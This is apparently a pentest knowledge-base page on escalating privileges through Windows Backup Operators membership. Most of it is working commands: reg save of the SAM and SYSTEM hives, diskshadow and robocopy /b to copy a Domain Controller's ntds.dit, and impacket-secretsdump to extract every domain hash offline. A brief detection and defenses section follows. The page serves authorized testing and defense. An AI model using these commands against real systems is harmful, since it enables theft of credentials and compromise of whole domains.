# Backup Operators

Membership in **Backup Operators** grants `SeBackupPrivilege` and `SeRestorePrivilege` — the right to read and write **any file on the system regardless of its ACL**, so that backup software can copy locked, protected files. Offensively, that is a full escalation: a Backup Operator can copy the SAM and SYSTEM hives (or, on a Domain Controller, `NTDS.dit`) and recover credentials offline, or overwrite a file a SYSTEM process runs. This is the group-membership route to the privilege abuse detailed in [SeBackup and SeRestore Abuse](../Token-Privilege-Abuse/SeBackup-and-SeRestore-Abuse.md).

## Confirm membership and privilege

```cmd
whoami /groups | findstr /i "Backup Operators"
whoami /priv   | findstr /i "SeBackup SeRestore"
```

## Exploitation — dump the local hives

```cmd
reg save HKLM\SAM  C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
```

Or copy locked files with backup semantics via `diskshadow` + `robocopy /b`. Then extract offline:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

## Exploitation — Domain Controller (NTDS.dit)

On a DC, a Backup Operator can back up the AD database and SYSTEM hive, then dump every domain hash offline:

```cmd
diskshadow /s ntds.txt
robocopy /b Z:\Windows\NTDS C:\Windows\Temp ntds.dit
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
```

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

## Detection and defenses

- **Detection:** SAM/SYSTEM/`ntds.dit` access via `reg save`/`diskshadow`/`robocopy /b`, Event ID 4674, Backup Operators membership changes.
- **Defenses:** restrict Backup Operators to genuine backup service accounts; treat DC membership as tier-0.

## Related
- [Windows Built in Groups](Windows-Built-in-Groups.md) — group overview and escalation map
- [SeBackup and SeRestore Abuse](../Token-Privilege-Abuse/SeBackup-and-SeRestore-Abuse.md) — the underlying privilege abuse in detail
- [SAM and SYSTEM files](../Password-Mining/SAM-and-SYSTEM-files.md) · [NTDS.DIT Active Directory Domain](../Password-Mining/NTDS.DIT-Active-Directory-Domain.md) — cracking the recovered hives
- Pass The Hash Attack — use the recovered hashes without cracking
